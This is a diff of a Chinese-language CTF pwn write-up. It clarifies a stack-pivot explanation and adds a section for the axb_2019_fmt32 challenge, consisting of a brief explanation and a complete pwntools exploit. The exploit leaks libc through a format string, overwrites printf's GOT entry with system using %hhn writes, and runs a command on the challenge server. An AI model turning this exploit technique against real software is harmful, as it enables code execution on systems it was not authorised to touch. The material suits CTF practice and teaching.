@@ -766,7 +766,7 @@ p.sendline(b'b'*(0x14+4)+p32(e.sym['printFlag']))
 p.interactive()
 ```
 ### gyctf_2020_borrowstack
-本身只有两次写入机会，第一次写入栈的缓冲区，第二次写入一个全局变量；但缓冲区溢出的部分只能覆盖到返回地址，所以需要同时覆盖rbp并加上leave ret指令，把栈转移到全局变量所在的内存。同时要注意抬高转移的目的地址，防止写入到不该写的地方引起segfault
+本身只有两次写入机会，第一次写入栈的缓冲区，第二次写入一个全局变量；但缓冲区溢出的部分只能覆盖到返回地址，所以需要同时覆盖rbp并加上leave ret指令，把栈转移到全局变量所在的内存。由于全局变量位于rw段的起始位置，前一个段为只读，要注意抬高转移的目的地址，防止写入到前一个段引起segfault
 
 ```python
 #!/usr/bin/python3.6
@@ -845,5 +845,58 @@ p.sendline(payload)
 payload = b'/bin/sh\x00' + p32(write_addr) + p32(0)
 p.sendline(payload)
 
+p.interactive()
+```
+
+### axb_2019_fmt32
+
+人类的本质是：人类的本质是：人类的本质是：~
+
+溢出程序存在一个格式字符串漏洞。第一步先通过%s泄露libc；第二步利用 %hhn 控制符将字节写入指定地址的特性，使用三个 %hhn 把printf got地址的低三个字节覆盖为system，最后再输入 /bin/sh。因为system的地址是动态变化的，第二步也要根据system动态产生格式字符串。
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+filename = './axb_2019_fmt32'
+# p = process(filename)
+p = remote('node3.buuoj.cn', 28141)
+e = ELF(filename)
+libc = ELF('/home/ubuntu/glibc-lib/ubuntu_16_x86_libc-2.23.so')
+
+def send_payload(data):
+    p.sendlineafter(b'Please tell me:', data)
+
+c_func_name = 'printf'
+log.info(f'got={hex(e.got[c_func_name])}')
+
+send_payload(b'Z' + p32(e.got[c_func_name]) + b'%c'*7 + b'%s')
+p.recvuntil(p32(e.got[c_func_name]))
+p.recv(7)
+c_func_addr = u32(p.recv(4))
+libc_base = c_func_addr - libc.sym[c_func_name]
+system_addr = libc_base + libc.sym['system']
+printf_got = e.got['printf']
+
+log.success(f'printf_got={hex(printf_got)}, {c_func_name}={hex(c_func_addr)}, base={hex(libc_base)}, system={hex(system_addr)}')
+
+length_addr_pairs = [(b, printf_got+i) for i, b in enumerate(p32(system_addr)[:3])]
+length_addr_pairs = sorted(length_addr_pairs, key=lambda i: i[0])
+
+log.info(f'length={[(hex(b), hex(addr)) for b, addr in length_addr_pairs]}')
+
+front = b'Y' + p32(0x46464646).join([p32(b[1]) for b in length_addr_pairs])
+offset = len(b'Repeater:'+front)
+
+assert length_addr_pairs[0][0] > 6+offset
+
+payload = b'%c'*6 
+b1, b2, b3 = map(lambda i: i[0], length_addr_pairs)
+payload += f'%{b1-6-offset}c%hhn%{b2-b1}c%hhn%{b3-b2}c%hhn'.encode()
+payload = front + payload
+
+log.info(f'payload={payload}')
+send_payload(payload)
+p.sendline(f';cat flag.txt')
 p.interactive()
 ```
